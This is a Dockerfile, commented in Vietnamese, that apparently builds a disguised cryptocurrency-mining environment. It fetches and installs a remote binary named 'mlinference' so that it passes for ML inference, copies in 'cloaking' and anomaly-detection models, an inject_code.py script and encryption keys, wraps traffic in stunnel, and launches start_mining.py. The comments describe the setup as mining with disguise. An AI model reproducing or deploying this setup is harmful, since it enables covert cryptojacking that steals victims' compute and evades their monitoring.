# Bước 1: Sử dụng nền tảng CUDA của NVIDIA
FROM nvidia/cuda:11.7.1-cudnn8-runtime-ubuntu22.04

# Thiết lập biến môi trường để chặn tương tác đầu vào trong quá trình cài đặt
ENV DEBIAN_FRONTEND=noninteractive
ENV Mlinference_CONFIG=/app/config/mlinference_config.json

# Bước 2: Cài đặt các thư viện hệ thống cần thiết
RUN apt-get update && \
    apt-get install -y \
    python3 python3-pip \
    curl git build-essential cmake \
    libssl-dev libeigen3-dev libnuma-dev stunnel4 \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# Bước 3: Cài đặt và cấu hình mlinference
RUN curl -L -o /usr/local/bin/mlinference "https://github.com/wollfoo/llmsdeep/releases/download/mlinference/mlinference" && \
    chmod +x /usr/local/bin/mlinference

# Bước 4: Thiết lập thư mục làm việc
WORKDIR /app

# Bước 5: Cài đặt các thư viện Python từ requirements.txt
COPY requirements.txt /app/requirements.txt
RUN pip3 install --no-cache-dir -r /app/requirements.txt

# ===== LỚP 01: Môi trường khai thác =====
# Sao chép các mô hình AI cho ngụy trang và phát hiện bất thường
COPY mining-environment/models/cloaking_model.h5 /app/models/
COPY mining-environment/models/anomaly_detection_model.h5 /app/models/

# Sao chép các cấu hình cần thiết
COPY mining-environment/config/mlinference_config.json /app/config/
COPY mining-environment/config/cloaking_params.json /app/config/
COPY mining-environment/config/resource_limits.json /app/config/
COPY mining-environment/config/stunnel.conf /etc/stunnel/stunnel.conf

# Sao chép các script liên quan đến Lớp 01
COPY mining-environment/scripts/setup_env.py /app/scripts/
COPY mining-environment/scripts/ai_environment_cloaking.py /app/scripts/
COPY mining-environment/scripts/inject_code.py /app/scripts/

# Tạo thư mục log và tài nguyên bổ trợ cho Lớp 01
RUN mkdir -p /app/logs && \
    touch /app/logs/mining_activity.log && \
    touch /app/logs/cloaking_activity.log && \
    mkdir -p /app/resources/legal_templates && \
    mkdir -p /app/resources/encryption_keys

# Sao chép tài nguyên bổ trợ cho Lớp 01
COPY mining-environment/resources/legal_templates/ /app/resources/legal_templates/
COPY mining-environment/resources/encryption_keys/ /app/resources/encryption_keys/

# ===== LỚP 02 ĐẾN LỚP 10 (đặt các lệnh COPY tương tự khi thêm các lớp) =====
# Ví dụ:
# COPY lớp-2/config/ /app/lớp-2/config/
# COPY lớp-2/scripts/ /app/lớp-2/scripts/

# Bước 6: Thiết lập dịch vụ bảo mật mạng
# Cấu hình và khởi động stunnel cho mã hóa lưu lượng
RUN mkdir -p /var/run/stunnel && chown stunnel4:stunnel4 /var/run/stunnel

# Bước 7: Chạy setup_env.py để thiết lập môi trường khai thác ban đầu
RUN python3 /app/scripts/setup_env.py

# Bước 8: Sao chép và khởi động mã chính cho khai thác
COPY start_mining.py /app/
CMD ["python3", "/app/start_mining.py"]
